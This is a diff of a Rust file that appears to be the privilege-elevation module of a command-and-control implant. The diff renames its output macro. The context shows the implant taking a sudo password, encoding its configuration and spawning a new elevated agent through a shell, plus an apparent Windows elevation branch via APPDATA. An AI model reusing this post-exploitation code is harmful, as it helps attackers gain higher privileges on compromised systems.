@@ -2,7 +2,7 @@ use std::error::Error;
 use sysinfo::{System, SystemExt, UserExt};
 use whoami::username;
 use crate::config::ConfigOptions;
-use crate::cmd::{CommandArgs, notion_out};
+use crate::cmd::{CommandArgs, command_out};
 use std::env::args;
 use std::process::Command;
 use litcrypt::lc;
@@ -58,7 +58,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                     let pwd = cmd_args.nth(0).unwrap();
                     // Check for empty pw
                     if pwd.is_empty() {
-                        return notion_out!("Need a sudo password!");
+                        return command_out!("Need a sudo password!");
                     }
                     let encoded_config = config_options.to_base64();
                     let agent_path = args().nth(0).unwrap();
@@ -67,9 +67,9 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                     .arg("-c")
                     .arg(cmd_string)
                     .spawn()?;
-                    notion_out!("Elevation attempted. Look for the new agent!")
+                    command_out!("Elevation attempted. Look for the new agent!")
             }
-                _ => notion_out!("Unknown elevation method")
+                _ => command_out!("Unknown elevation method")
             }
         }
 
@@ -108,24 +108,24 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                                     std::time::Duration::from_secs(1);
                                     std::thread::sleep(sleep_time);
                                 }
-                                notion_out!("Elevation attempted. Look for the new agent!")
+                                command_out!("Elevation attempted. Look for the new agent!")
                             },
                             Err(e) => { return Ok(e.to_string())}
                         }  
                     } else {
-                        notion_out!("Couldn't get APPDATA location")
+                        command_out!("Couldn't get APPDATA location")
                     }
 
                     
 
                 }
                 _ => {
-                    notion_out!("Elevation unavailable")
+                    command_out!("Elevation unavailable")
                 }
             }
         }
 
     } else {
-        notion_out!("Elevation unavailable")
+        command_out!("Elevation unavailable")
     }
 }
